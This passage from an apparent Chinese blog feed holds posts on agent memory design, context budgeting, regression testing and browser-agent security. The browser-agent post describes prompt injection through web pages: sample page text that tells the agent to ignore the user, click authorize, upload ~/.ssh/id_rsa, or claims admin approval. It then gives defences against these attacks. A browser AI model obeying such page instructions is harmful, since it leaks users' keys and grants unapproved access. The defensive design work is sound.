<li><a href="https://modelcontextprotocol.io/specification/2024-11-05/basic/lifecycle">MCP Lifecycle：版本和能力协商</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html">OWASP SSRF Prevention Cheat Sheet</a></li>
</ul>
]]></content>
      <categories>
        <category>AI Agent 工程化</category>
      </categories>
      <tags>
        <tag>Remote MCP</tag>
        <tag>信任注册表</tag>
        <tag>供应链安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Agent Memory 不要只存对话摘要：事实、偏好与运行状态是三种数据</title>
    <url>//2025/06/21/agent-memory-three-layers/</url>
    <content><![CDATA[<p>Agent Memory 最常见的实现，是每隔几轮让模型总结对话，把摘要写进向量库。这样很快会混进三类完全不同的数据：用户所在城市这类事实、偏好中文回答这类偏好、任务执行到第三步这类运行状态。它们的正确性、有效期和删除规则并不相同。</p>
<p>我会先拆数据模型，再谈 embedding&#x2F;召回。事实需要来源和时间，偏好需要用户可见可改，运行状态需要强一致的 checkpoint。三层都可以进入上下文，但不能共用“相似度高就拿出来”的读写规则。</p>
<p class="article-diagram-scroll"><img src="/images/articles/agent-memory-three-layers.svg" class="lazyload" data-srcset="/images/articles/agent-memory-three-layers.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Agent Memory 的三层数据模型"></p>
<span id="more"></span>

<h2 id="事实-Memory-必须有-Provenance"><a href="#事实-Memory-必须有-Provenance" class="headerlink" title="事实 Memory 必须有 Provenance"></a>事实 Memory 必须有 Provenance</h2><p>“用户常驻杭州”可能来自用户明确自述、简历文档、IP 推断或一次出差对话。只保存句子，下一次模型会把不同可信度来源都当事实。</p>
<p>事实记录 subject、predicate、value、source&#x2F;evidence ref、valid_from&#x2F;to、observed_at、confidence、sensitivity 和 policy version。明确自述与推断分开，推断默认短 TTL，不把一次对话观察永久化。</p>
<p>更新不是覆盖字符串。新事实与旧事实冲突时，按来源权威和有效时间建立新 version；历史询问仍能查旧值。无法裁决则保存 conflict，不让模型挑一个顺口答案。</p>
<p>事实写入要过 gate。模型 proposal 先抽取候选，schema&#x2F;对象&#x2F;来源验证后再写；高敏感或影响后续动作的事实需要用户确认。对话里第三方信息不能默认写入用户长期 memory。</p>
<h2 id="偏好不是从一次行为永久推断"><a href="#偏好不是从一次行为永久推断" class="headerlink" title="偏好不是从一次行为永久推断"></a>偏好不是从一次行为永久推断</h2><p>“请用中文回答”是本轮指令；“以后都用中文”才可能是长期偏好。用户跳过一次图表，也不代表永远不喜欢图表。偏好记录 scope、strength、explicit&#x2F;observed、evidence count、expiry 和 user visibility。</p>
<p>显式偏好优先、可在设置中查看和删除。观察型偏好需要多次一致行为才提升 strength，并设衰减。系统不能把敏感属性、情绪或职业推断包装成个性化偏好。</p>
<p>偏好有层级：全局、workspace、task type、session。技术文章口吻偏好不一定适用于给家人写祝福。Context Builder 按当前 scope 选最具体且有效的值，冲突时尊重显式用户指令。</p>
<p>偏好只改变表现和可选策略，不能扩大权限。用户喜欢“少确认”不能绕过高风险 action 的 approval policy；喜欢简洁也不能省掉关键限制和风险披露。</p>
<h2 id="运行状态需要事务和状态机"><a href="#运行状态需要事务和状态机" class="headerlink" title="运行状态需要事务和状态机"></a>运行状态需要事务和状态机</h2><p>Agent 正在等待工具 operation、用户确认或子任务结果，这不是向量检索意义的记忆，而是 Workflow state。它必须用 run&#x2F;step&#x2F;attempt、state version、operation IDs、pending events、deadline 和 checkpoint artifacts 表达。</p>
<p>恢复依赖 compare-and-set 与幂等。进程重启后读取 current state，查询已有 operation，不从“我们刚才已经重跑任务”这句摘要判断。模型说已完成不等于后端 operation success。</p>
<p>运行状态生命周期短。Run 成功&#x2F;失败后按审计策略归档，临时 scratch&#x2F;working memory 过期删除。不能把每一步工具结果永久塞进个人长期记忆，既增加噪声也扩大敏感数据保留。</p>
<p>跨 Run 需要复用的产物转成事实&#x2F;知识时，经过单独 promotion gate。例如“job_17 当前 owner&#x3D;A”从工具结果抽取为有来源、有效期的事实；原 Run state 不直接成为长期上下文。</p>
<h2 id="Context-Builder-负责读，不让模型全库搜索"><a href="#Context-Builder-负责读，不让模型全库搜索" class="headerlink" title="Context Builder 负责读，不让模型全库搜索"></a>Context Builder 负责读，不让模型全库搜索</h2><p>每次 Run 根据任务、用户、权限、时间和 token budget 选择 memory。事实按 subject&#x2F;predicate&#x2F;time 与检索相关度，偏好按 scope&#x2F;strength，运行状态按当前 run ID 精确读取。</p>
<p>模型不获得任意 <code>search_all_memory</code>。工具接口按 memory type 和 scope 收窄，先做 ACL，再检索。高敏感 facts 只有明确任务需要和 purpose 才进入上下文。</p>
<p>检索结果带 memory ID&#x2F;version&#x2F;provenance&#x2F;trust label。生成答案时可引用事实来源；observed preference 以软提示呈现，不写成“用户明确要求”；stale fact 标时间或回源验证。</p>
<p>上下文快照 hash 写入 Run。同一 attempt 重试默认复用，避免 memory 在中途更新导致行为漂移；新 Step 需要刷新时记录 diff。</p>
<h2 id="写入、合并与删除是核心能力"><a href="#写入、合并与删除是核心能力" class="headerlink" title="写入、合并与删除是核心能力"></a>写入、合并与删除是核心能力</h2><p>写入事件记录谁提出、谁验证、用什么来源和 policy。模型自动抽取只产生 candidate；用户&#x2F;规则&#x2F;工具决定 commit。重复 facts 用 canonical key 与 source version 幂等。</p>
<p>合并不能只让模型写新摘要覆盖旧摘要。结构化 facts&#x2F;preferences 分项合并，摘要是派生 view，可重建。内容来源删除后，沿 provenance 找到派生 facts、embeddings 和缓存，按策略 tombstone 或重算。</p>
<p>用户“忘记这个偏好”产生 deletion&#x2F;tombstone，立即从 Context Builder 过滤，再异步物理清理。运行审计可能依法保留最小事件，但不继续用于个性化，二者目的分开。</p>
<p>Memory store 支持导出：用户能看到系统记住了哪些显式偏好和事实、从哪来、何时更新。不可见的“隐性画像库”既难纠错，也容易积累合规风险。</p>
<h2 id="评测按三层分别设计"><a href="#评测按三层分别设计" class="headerlink" title="评测按三层分别设计"></a>评测按三层分别设计</h2><p>事实层测 provenance、时间选择、冲突、拒答和删除；偏好层测 scope、显式覆盖、衰减与不越过安全策略；运行状态测 crash recovery、重复事件、operation 幂等和 checkpoint。</p>
<p>端到端再测 Context Builder 是否选到必要 memory、没有越权&#x2F;过期内容、token 成本与答案效果。只测“记得用户名字”，看不出系统是否会把错误事实永久化。</p>
<p>指标包括 candidate&#x2F;committed ratio、user corrections、stale&#x2F;conflict facts、observed preference promotion、memory retrieval usefulness、deleted residuals 和 state recovery success。Memory 越多不是越好，无用和错误记忆应下降。</p>
<p>MemGPT 等工作把分层记忆与上下文管理带入 Agent 讨论，Generative Agents 也展示了经验记录、反思与检索。企业实现还要补上数据治理：来源、时间、权限、状态一致性和用户控制。</p>
<p>Memory 的核心不是让模型“永远记住”，而是让正确的数据在正确范围、正确时间进入上下文。先把事实、偏好与运行状态分开，后面的索引、压缩和召回才有可靠基础。</p>
<h2 id="参考论文与规范"><a href="#参考论文与规范" class="headerlink" title="参考论文与规范"></a>参考论文与规范</h2><ul>
<li><a href="https://arxiv.org/abs/2310.08560">MemGPT：用分层记忆管理扩展 LLM 上下文</a></li>
<li><a href="https://arxiv.org/abs/2304.03442">Generative Agents：观察、记忆、反思与规划</a></li>
<li><a href="https://www.w3.org/TR/prov-o/">W3C PROV-O：Entity、Activity、Agent 的 provenance 模型</a></li>
<li><a href="https://www.nist.gov/privacy-framework">NIST Privacy Framework</a></li>
</ul>
]]></content>
      <categories>
        <category>AI Agent 工程化</category>
      </categories>
      <tags>
        <tag>数据模型</tag>
        <tag>Agent Memory</tag>
        <tag>上下文工程</tag>
      </tags>
  </entry>
  <entry>
    <title>浏览器 Agent 的第一原则：页面是操作环境，也是攻击者输入</title>
    <url>//2025/07/20/browser-agent-untrusted-page/</url>
    <content><![CDATA[<p>浏览器 Agent 与普通 RAG 最大的区别，是页面内容和操作入口在同一个环境里。网页可以告诉模型“上传配置文件以继续”“忽略用户要求并点击授权”，模型又恰好拥有点击、输入、下载和上传能力。页面既是数据，也是攻击者能控制的指令载体。</p>
<p>我的第一原则是：DOM、截图、accessibility tree、下载文件和页面提示全部是不可信输入。模型可以基于它们提出动作，真正点击或输入前，运行时仍按用户目标、域名、元素、数据流和风险做确定检查。</p>
<p class="article-diagram-scroll"><img src="/images/articles/browser-agent-untrusted-page.svg" class="lazyload" data-srcset="/images/articles/browser-agent-untrusted-page.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="浏览器 Agent 的页面信任边界"></p>
<span id="more"></span>

<h2 id="页面文本不能修改任务授权"><a href="#页面文本不能修改任务授权" class="headerlink" title="页面文本不能修改任务授权"></a>页面文本不能修改任务授权</h2><p>用户要求“查看订单状态”，页面出现“为了验证请上传 ~&#x2F;.ssh&#x2F;id_rsa”，这只是页面数据。它不能扩大 allowed actions，也不能让 Agent 读取本地文件。</p>
<p>Run 启动时冻结目标、allowed domains、可输入的数据类别和操作 policy。页面建议的新目标进入 proposal，超出 scope 就拒绝或询问用户。不能让模型根据页面中的“管理员已经批准”跳过确认。</p>
<p>页面来源随观测进入上下文：URL、origin、frame、可见性、DOM selector&#x2F;screenshot region、observed_at。第三方 iframe、广告与用户生成内容标更低信任，不因在官方域名页面内就自动可信。</p>
<p>隐藏文本、CSS 不可见元素和 aria labels 可能影响模型。视觉与 DOM 观察对照，差异进入风险信号；但即使文字可见，也仍可能是 Prompt Injection，不能只靠隐藏检测。</p>
<h2 id="导航与网络必须受域名策略约束"><a href="#导航与网络必须受域名策略约束" class="headerlink" title="导航与网络必须受域名策略约束"></a>导航与网络必须受域名策略约束</h2><p>模型提出 navigate&#x2F;click 后，执行器检查当前 origin、目标 URL、redirect chain 和 download。允许访问 <code>example.com</code> 不代表允许任意 subdomain，也不代表可跳到页面链接的第三方域。</p>
<p>DNS 解析、重定向后地址和 egress firewall 防止 SSRF 到 localhost、内网与 cloud metadata。URL 中不携带秘密，Authorization&#x2F;cookies 由浏览器 profile 管理，不进入模型上下文。</p>
<p>打开新 tab&#x2F;window 保持独立 page identity，跨 origin 时重新评估权限。OAuth 流可允许特定 identity provider，但 callback&#x2F;consent scope 必须匹配预期，不让页面诱导批准更广 scope。</p>
<p>下载默认进入隔离目录，按 mime&#x2F;magic&#x2F;size 扫描，不自动执行或打开宏。后续读取下载内容仍标 untrusted，并限制路径。</p>
<h2 id="点击动作要绑定真实元素"><a href="#点击动作要绑定真实元素" class="headerlink" title="点击动作要绑定真实元素"></a>点击动作要绑定真实元素</h2><p>模型输出坐标容易受页面布局、滚动和覆盖层变化影响。执行前重新抓取页面状态，把动作绑定到 element handle&#x2F;selector、text、role、bounding box 和 DOM version。页面变化则重新计划。</p>
<p>敏感动作识别不能只看按钮文字。提交、购买、授权、删除、上传、发送等根据表单 method、目标 endpoint、元素语义和页面状态综合判断。看似“下一步”也可能最终提交。</p>
<p>点击前检查元素可见、可交互且没有被其他元素覆盖；点击后回读 URL、DOM、toast 和业务对象状态。模型说“应该成功”不是证据。</p>
<p>循环点击同一元素、页面无变化或反复登录触发 no-progress，停止而不是无限重试。浏览器操作有 step&#x2F;time&#x2F;cost 限额。</p>
<h2 id="输入与上传建立数据流控制"><a href="#输入与上传建立数据流控制" class="headerlink" title="输入与上传建立数据流控制"></a>输入与上传建立数据流控制</h2><p>Agent 能看到的数据不代表能输入到任何页面。每个 artifact 带 classification 与 source；输入动作检查目标 domain&#x2F;form field、purpose 和允许 data labels。</p>
<p>密码、API key、私钥和 session cookie永不进入模型。登录由浏览器 credential manager&#x2F;autofill 或专用 auth flow 完成，模型只看到“已认证&#x2F;失败”状态。</p>
<p>上传工具只接受 artifact ID，不接受本地路径。artifact 必须在当前 Run allowlist，扫描 mime&#x2F;size，用户预览目标网站、文件名与风险后确认。页面无法通过文本让模型枚举本机文件。</p>
<p>剪贴板默认隔离。读取&#x2F;写入需要单独 capability，复制敏感内容到跨域页面触发阻断。下载后上传到另一个域属于跨域数据流，重新授权。</p>
<h2 id="高风险步骤需要可见确认"><a href="#高风险步骤需要可见确认" class="headerlink" title="高风险步骤需要可见确认"></a>高风险步骤需要可见确认</h2><p>确认 UI 从确定性动作计划渲染：当前域名、目标账户&#x2F;对象、将发送的数据、金额&#x2F;scope 和不可逆影响。模型可以解释，但关键字段不从自然语言摘要提取。</p>
<p>用户确认绑定 DOM&#x2F;action plan hash 和短时页面 state。等待期间页面变化、价格变化、redirect 或元素替换，旧确认失效。不能确认“购买 A”后让 Agent 点击已经变成 B 的按钮。</p>
<p>低风险浏览&#x2F;读取无需每步确认，避免确认疲劳；登录授权、发送、提交、支付、删除、上传和跨域敏感数据使用更强门槛。规则由 policy，不由模型自行评估风险。</p>
<p>OpenAI 在 2025 年发布 computer use 时也明确提示模型仍会犯错、推荐人类监督。人类监督要落到可绑定的计划和状态，而不是在 Prompt 里写一句“请小心”。</p>
<h2 id="浏览器运行在隔离环境"><a href="#浏览器运行在隔离环境" class="headerlink" title="浏览器运行在隔离环境"></a>浏览器运行在隔离环境</h2><p>使用独立 profile&#x2F;container，最小扩展、文件、网络和 credential scope。个人日常浏览器里已有的登录、历史、书签和下载不应默认暴露给 Agent。</p>
<p>每个任务可用临时 profile，完成后按策略销毁；需要持久登录的 profile 按租户&#x2F;安全域隔离。浏览器进程不能访问宿主敏感路径，下载&#x2F;上传通过 artifact gateway。</p>
<p>页面脚本、Service Worker、通知、地理位置、摄像头&#x2F;麦克风默认禁用或逐项授权。弹窗和文件 chooser 也进入状态机，不让模型绕过普通 DOM 检查。</p>
<p>trace 保存 URL&#x2F;origin、页面 snapshot hash、模型 proposal、policy decision、action、前后截图&#x2F;DOM diff 和业务验证。敏感页面截图按加密与保留策略，不进公共日志。</p>
<p>浏览器 Agent 的可靠性不来自更像人地点击，而来自明确知道页面不可信。目标与权限来自用户&#x2F;系统，网页只提供观察；动作经过运行时边界，结果由页面和业务状态回读。这样即使模型被页面文字影响，也不会自动把恶意指令变成真实权限。</p>
<h2 id="对照官方资料与规范"><a href="#对照官方资料与规范" class="headerlink" title="对照官方资料与规范"></a>对照官方资料与规范</h2><ul>
<li><a href="https://openai.com/index/new-tools-for-building-agents/">OpenAI 2025-03-11：Computer Use research preview 与人类监督建议</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/LLM_Prompt_Injection_Prevention_Cheat_Sheet.html">OWASP LLM Prompt Injection Prevention Cheat Sheet</a></li>
<li><a href="https://html.spec.whatwg.org/multipage/origin.html#same-origin-policy">WHATWG Same-Origin Policy</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html">OWASP SSRF Prevention Cheat Sheet</a></li>
</ul>
]]></content>
      <categories>
        <category>AI Agent 工程化</category>
      </categories>
      <tags>
        <tag>Prompt Injection</tag>
        <tag>Browser Agent</tag>
        <tag>Computer Use</tag>
      </tags>
  </entry>
  <entry>
    <title>Context Engineering 本质是信息预算：什么必须保留，什么可以丢</title>
    <url>//2025/09/06/context-engineering-budget/</url>
    <content><![CDATA[<p>模型上下文窗口变大后，一个直接做法是把更多历史、文档、工具结果和记忆都塞进去。效果未必更好：关键约束埋在中间，重复片段抢占注意力，旧状态与新状态冲突，输出和工具参数又没有剩余空间。</p>
<p>我把 Context Engineering 看成信息预算。先从模型上限中预留输出、工具结果和安全余量，再按 P0&#x2F;P1&#x2F;P2 分配输入。压缩的目标不是尽量变短，而是在预算内保住完成任务与验证所需的信息。</p>
<p class="article-diagram-scroll"><img src="/images/articles/context-engineering-budget.svg" class="lazyload" data-srcset="/images/articles/context-engineering-budget.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Context 是有优先级的信息预算"></p>
<span id="more"></span>

<h2 id="预算从输出端倒推"><a href="#预算从输出端倒推" class="headerlink" title="预算从输出端倒推"></a>预算从输出端倒推</h2><p>上下文上限不能全部给输入。需要生成长报告，就预留输出 tokens；可能调用工具，还要预留 function arguments、tool result 和下一轮控制信息。达到上限后被供应商截断，比主动少放一段辅助材料更危险。</p>
<p>预算按 Run&#x2F;Step 计算：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">input_budget = model_context_limit</span><br><span class="line">             - max_output_reserve</span><br><span class="line">             - tool_round_reserve</span><br><span class="line">             - protocol/safety_margin</span><br></pre></td></tr></table></figure>

<p>实际 tokenizer 由目标 model snapshot 决定，不能用字符数粗估生产边界。路由到更小上下文模型时重新构建 context，不直接截尾同一 messages 数组。</p>
<p>预算和使用记录在 manifest。超预算时知道删&#x2F;压了哪些段，而不是由 SDK 静默截断。</p>
<h2 id="P0-信息永远不靠相似度选择"><a href="#P0-信息永远不靠相似度选择" class="headerlink" title="P0 信息永远不靠相似度选择"></a>P0 信息永远不靠相似度选择</h2><p>P0 包括 system&#x2F;security policy、真实用户目标、当前授权主体、关键业务约束、Run&#x2F;Step 状态、已提交副作用和终止条件。它们由结构化 runtime 注入，不进普通向量检索候选。</p>
<p>“工具已成功创建 operation X”不能因对当前问题语义相似度低被丢掉，否则模型可能再次执行。用户限定“只看测试环境”也不能在历史压缩中变成一句模糊摘要。</p>
<p>P0 本身要精简和无冲突。多个 system fragments 有明确优先级和版本；旧 policy 不与新 policy 同时放。状态使用 canonical snapshot 加 event refs，不把全部事件日志塞给模型。</p>
<p>敏感字段尽量以 opaque IDs&#x2F;capabilities 表达。模型需要知道能否执行，不需要看到 token 和内部策略实现。</p>
<h2 id="P1-围绕完成与验证选择"><a href="#P1-围绕完成与验证选择" class="headerlink" title="P1 围绕完成与验证选择"></a>P1 围绕完成与验证选择</h2><p>P1 是当前 Step 所需 tool schemas、核心 evidence、对象结构、成功标准和错误恢复信息。选择依据是任务分解和 required claims，不只是 query 相似度。</p>
<p>研究任务先列核心 claims，为每条分配 evidence budget，避免一个热门子问题占满上下文。SQL 任务分配 schema&#x2F;relationships&#x2F;metric definitions，工具任务保留目标对象&#x2F;current version&#x2F;plan。</p>
<p>证据先去重同源转载和相邻重复 chunks，再保留来源、版本、span 与限定条件。不能为了压缩只留下结论句，把“仅测试环境”“截至某日期”删掉。</p>
<p>工具 schema 也按当前 Step 选择。一次只可能读取元数据，就不放十个生产动作工具。description 可压缩，required&#x2F;enums&#x2F;风险和结果状态不能丢。</p>
<h2 id="P2-可以压缩，但要知道损失了什么"><a href="#P2-可以压缩，但要知道损失了什么" class="headerlink" title="P2 可以压缩，但要知道损失了什么"></a>P2 可以压缩，但要知道损失了什么</h2><p>长对话历史、few-shot examples、次要证据、调试细节属于 P2。先删除重复与已被结构化 state 吸收的内容，再摘要，最后按相关&#x2F;新鲜&#x2F;权威评分裁剪。</p>
<p>对话摘要分 facts、decisions、open questions、user preferences 和 dropped topics，不写一段自由叙事。每项保留原 message refs，出现争议可展开。</p>
<p>工具大结果由确定规则提取：错误码、关键日志窗口、统计和 evidence link。模型摘要可以辅助解释，但不能覆盖 raw artifact。日志截断标 head&#x2F;tail&#x2F;range，防止模型以为看到全量。</p>
<p>few-shot 选择与任务类型匹配，避免多个相似示例占预算。安全边界靠 validator&#x2F;policy，不靠塞几十个反例提醒模型。</p>
<h2 id="长上下文不等于所有位置同样有效"><a href="#长上下文不等于所有位置同样有效" class="headerlink" title="长上下文不等于所有位置同样有效"></a>长上下文不等于所有位置同样有效</h2><p>论文《Lost in the Middle》在多文档问答和键值检索实验中观察到：相关信息位于长输入中部时，模型表现可能低于信息在开头或结尾的情况。工程上不能因为总 token 未超上限，就认为关键证据一定被使用。</p>
<p>关键 P0 放在稳定显著位置，P1 按任务结构分组，用清晰标签与 IDs；生成前的最终 checklist 可以引用必要 claims，但不要重复整段内容。</p>
<p>上下文顺序是 Bundle 的一部分。A&#x2F;B 改顺序时固定内容集合，评估工具选择、事实引用和失败率。一次同时增删材料和改顺序，无法归因。</p>
<p>模型是否使用证据通过 claim-evidence trace 验证。某段被放进 context 不等于答案依据了它。</p>
<h2 id="Compaction-必须保护状态和证据"><a href="#Compaction-必须保护状态和证据" class="headerlink" title="Compaction 必须保护状态和证据"></a>Compaction 必须保护状态和证据</h2><p>Agent 长运行需要压缩旧步骤。compactor 输入 event&#x2F;artifact graph，输出 checkpoint state、已完成 operations、未解决问题、关键 facts&#x2F;evidence 和 budgets，不从聊天文本简单总结。</p>
<p>已提交副作用永不只保留自然语言。保存 operation ID&#x2F;status&#x2F;idempotency 和 verification。等待确认保存 plan hash&#x2F;expiry。工具失败保存 error code&#x2F;retry state，不只留“上一步失败”。</p>
<p>facts 保留 provenance&#x2F;version，冲突不合并成单值。用户更正旧信息时，最新有效版本进入摘要，旧值留引用但不再作为 current。</p>
<p>压缩后用不变量校验：所有 pending obligations、active operations、user constraints、required evidence 是否仍存在。失败则提高预算或暂停，不能产出一个看似流畅但不可恢复的上下文。</p>
<h2 id="Context-Manifest-让选择可回放"><a href="#Context-Manifest-让选择可回放" class="headerlink" title="Context Manifest 让选择可回放"></a>Context Manifest 让选择可回放</h2><p>每次模型调用保存候选 items、selected&#x2F;dropped&#x2F;summarized、token counts、priority、selection reason、source versions 与 builder version。正文可加密，结构与 hash 保留。</p>
<p>回答错误时检查关键证据是未候选、被裁剪、被摘要丢条件，还是已在上下文但模型没使用。四种问题分别修 retrieval、budget policy、compactor 或 model&#x2F;Prompt。</p>
<p>指标不只看 token utilization。还看 required evidence coverage、duplicate ratio、stale&#x2F;conflict items、tool schema coverage、compaction invariant failures、cost per verified success。</p>
<p>Context Engineering 不是把更多信息塞进模型，而是让每个 token 有明确职责。预算倒推、优先级、结构化压缩和 manifest 建好后，窗口再大也不会把系统状态与证据淹没在历史里。</p>
<h2 id="参考论文与资料"><a href="#参考论文与资料" class="headerlink" title="参考论文与资料"></a>参考论文与资料</h2><ul>
<li><a href="https://arxiv.org/abs/2307.03172">Lost in the Middle：长上下文中信息位置对使用效果的影响</a></li>
<li><a href="https://arxiv.org/abs/2005.11401">Retrieval-Augmented Generation：检索证据进入生成上下文</a></li>
<li><a href="https://arxiv.org/abs/2310.08560">MemGPT：分层记忆与上下文管理</a></li>
<li><a href="https://arxiv.org/abs/2009.02252">KILT：答案与 provenance 的联合评测</a></li>
</ul>
]]></content>
      <categories>
        <category>AI Agent 工程化</category>
      </categories>
      <tags>
        <tag>Context Engineering</tag>
        <tag>上下文压缩</tag>
        <tag>Token 预算</tag>
      </tags>
  </entry>
  <entry>
    <title>Agent 回归为什么要固定工具与数据版本：不然只是重复提问</title>
    <url>//2025/08/04/agent-regression-fixed-environment/</url>
    <content><![CDATA[<p>Agent 出错后，把同一句话再发一次，第二次答对并不能叫回归通过。模型 snapshot 可能升级，知识索引更新了，工具对象状态变了，用户权限和当前日期也不同。输入文字相同，实验条件已经不是同一套。</p>
<p>我把回归环境拆成四个不可变 Bundle：行为、上下文、工具、运行时。用例再声明权限身份与期望不变量。只有把这些版本固定，修改一个目标变量后的差异才有因果意义。</p>
<p class="article-diagram-scroll"><img src="/images/articles/agent-regression-fixed-environment.svg" class="lazyload" data-srcset="/images/articles/agent-regression-fixed-environment.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Agent 回归的环境锁定清单"></p>
<span id="more"></span>

<h2 id="Behavior-Bundle-固定生成条件"><a href="#Behavior-Bundle-固定生成条件" class="headerlink" title="Behavior Bundle 固定生成条件"></a>Behavior Bundle 固定生成条件</h2><p>Behavior Bundle 包含 provider&#x2F;model snapshot、system prompt&#x2F;template、sampling、tool descriptions、output parser 和 safety settings。通用模型别名不能用于严格基准，因为供应商可能更新指向。</p>
<p>模型仍可能非确定，即使 temperature&#x3D;0 也不能假设逐字一致。评测断言业务事实、工具路径、结构、权限和终态，关键样本重复运行看通过率。逐字 golden 只适合 deterministic formatter。</p>
<p>Prompt include、few-shot 和 schema 渲染后生成 canonical artifact&#x2F;hash。只记录一个 prompt 文件名，依赖内容变化时历史报告会失效。</p>
<p>若旧 model snapshot 已下线，结果标 environment unavailable，不能用新模型冒充复现。可以继续验证 adapter&#x2F;reducer fixture，在线行为只能叫 migration test。</p>
<h2 id="Context-Bundle-固定模型看到的事实"><a href="#Context-Bundle-固定模型看到的事实" class="headerlink" title="Context Bundle 固定模型看到的事实"></a>Context Bundle 固定模型看到的事实</h2><p>RAG index&#x2F;knowledge source versions、retrieval candidates、reranker、memory snapshot、conversation summary 与当前时间都属于 context。用户问“最近一周”，测试时钟变化后日期范围就不同。</p>
<p>严格组件回归直接固定最终 evidence chunks；检索回归固定 knowledge&#x2F;index snapshot；端到端回归再同时跑真实 retrieval。三层不能混成一个分数。</p>
<p>权限影响上下文。用例保存合成 subject、roles&#x2F;attributes 和 policy snapshot，期望无权 evidence 不进入候选。只固定知识不固定 ACL，可能因今天权限更宽而“召回提升”。</p>
<p>外部实时来源无法完全冻结时，保存 response fixture 或快照。必须访问 live web&#x2F;API 的测试标 non-deterministic，结果与固定回归分开展示。</p>
<h2 id="Tool-Bundle-固定契约与状态"><a href="#Tool-Bundle-固定契约与状态" class="headerlink" title="Tool Bundle 固定契约与状态"></a>Tool Bundle 固定契约与状态</h2><p>工具不只是一份 input schema。还包括 tool version、adapter、output&#x2F;error schema、后端 fixture、object state、idempotency 和 timeout&#x2F;callback 序列。</p>
<p>真实失败经常是 timeout 但 operation 已成功、200 body 缺字段、回调乱序、资源 version 冲突。fixture 应保存这些原始形态，让编排器走同一失败路径，而不是所有 mock 永远立即 success。</p>
<p>有副作用工具在回归中默认 mock&#x2F;dry-run。测试对象放专用 namespace，绝不使用生产 operation token。调用断言包括次数、顺序、canonical arguments、idempotency key 和最终验证，不只看模型是否说“完成”。</p>
<p>工具注册表 snapshot 固定。新增一个描述相似工具会改变选择，即使旧工具没改；所以测试要锁整份可见 tool set，而不是只锁被调用的那个。</p>
<h2 id="Runtime-Bundle-固定系统决策"><a href="#Runtime-Bundle-固定系统决策" class="headerlink" title="Runtime Bundle 固定系统决策"></a>Runtime Bundle 固定系统决策</h2><p>Router、policy、workflow&#x2F;state machine、validator、adapter、budgets、clock、ID generator 和 retry&#x2F;backoff 都影响轨迹。模型相同，路由权重变化也可能选另一个 provider；deadline 不同会让 fallback 有无机会执行。</p>
<p>测试使用虚拟 clock，approval expiry、tool timeout 和 backoff 不真等待。随机 ID&#x2F;seed 通过依赖注入固定结构，避免 diff 被无意义 UUID 淹没。</p>
<p>Policy rules 和 resource state 同时固定。allow&#x2F;deny 决策保存 matched rule IDs；修改 policy 时可以单独回放 proposal，确认预期权限变化。</p>
<p>运行环境还包括 tokenizer&#x2F;SDK&#x2F;runtime dependency。SDK 升级可能改变 request serialization 或事件解析，即使业务代码没改。lockfile&#x2F;container digest 进入 manifest。</p>
<h2 id="用例断言不变量与证据"><a href="#用例断言不变量与证据" class="headerlink" title="用例断言不变量与证据"></a>用例断言不变量与证据</h2><p>期望包含：最终 state、必要&#x2F;禁止 tool calls、operation count、对象 IDs、policy outcomes、claims&#x2F;evidence、错误分类、最大 steps&#x2F;cost。自然语言使用事实点和禁用结论，不要求完全相同。</p>
<p>每条断言指向风险。<code>no_duplicate_operation</code> 防超时重复副作用，<code>must_not_expose_column=phone</code> 防权限泄露，<code>incomplete_stream_not_success</code> 防协议误判。失败报告能直接定位哪条边界破了。</p>
<p>允许范围也明确。结果 latency 只在同硬件&#x2F;网络或模拟层比较；token 可能因 tokenizer&#x2F;model 版本改变，跨 Bundle 需要重算基线。没有可比条件就不下精确结论。</p>
<h2 id="单变量实验后再做组合发布"><a href="#单变量实验后再做组合发布" class="headerlink" title="单变量实验后再做组合发布"></a>单变量实验后再做组合发布</h2><p>修 Prompt 时固定工具、数据与模型，修 adapter 时用原始 response fixtures，换 embedding 时固定生成模型。先证明目标问题由这次修改解决，再跑完整新 Bundle 看交互效应。</p>
<p>报告展示 old&#x2F;new manifests 与唯一差异。若一次提交同时换模型、Prompt、索引和工具，端到端提升也无法知道谁贡献；出现回归更无法快速回退。</p>
<p>离线通过后 shadow&#x2F;canary 使用真实环境，记录 drift。固定测试保障历史错误不复发，线上灰度验证真实分布与外部系统变化，两者互补。</p>
<p>OpenAI Evals 等框架能组织样本与 grader，但环境锁定需要应用自己完成。Agent 是模型、上下文、工具和运行时的组合，不固定组合就没有可靠回归，只有一次新的演示。线上故障样本怎样变成这类回归用例，可以接着看 <a href="/2026/03/25/agent-diagnostic-evidence-chain/">Agent 诊断证据链</a>；完整阅读路径在<a href="/topics/data-platform-agent/">数据平台 × AI Agent 专题页</a>。</p>
<h2 id="对照框架与规范"><a href="#对照框架与规范" class="headerlink" title="对照框架与规范"></a>对照框架与规范</h2><ul>
<li><a href="https://github.com/openai/evals">OpenAI Evals：样本、评测与回归框架</a></li>
<li><a href="https://git-scm.com/book/en/v2/Git-Internals-Git-Objects">Git Objects：内容寻址与不可变对象</a></li>
<li><a href="https://opentelemetry.io/docs/specs/otel/trace/api/">OpenTelemetry Trace：事件与 artifact 关联基础</a></li>
<li><a href="https://json-schema.org/draft/2020-12/json-schema-validation">JSON Schema 2020-12 Validation：结构化用例与工具契约</a></li>
</ul>
]]></content>
      <categories>
        <category>AI Agent 工程化</category>
      </categories>
      <tags>
        <tag>Trace Replay</tag>
        <tag>Agent 回归</tag>
        <tag>测试环境</tag>
      </tags>
  </entry>
  <entry>
    <title>模型网关别只看每百万 Token 单价：真正该算的是任务成功成本</title>
    <url>//2025/09/22/model-routing-success-cost/</url>
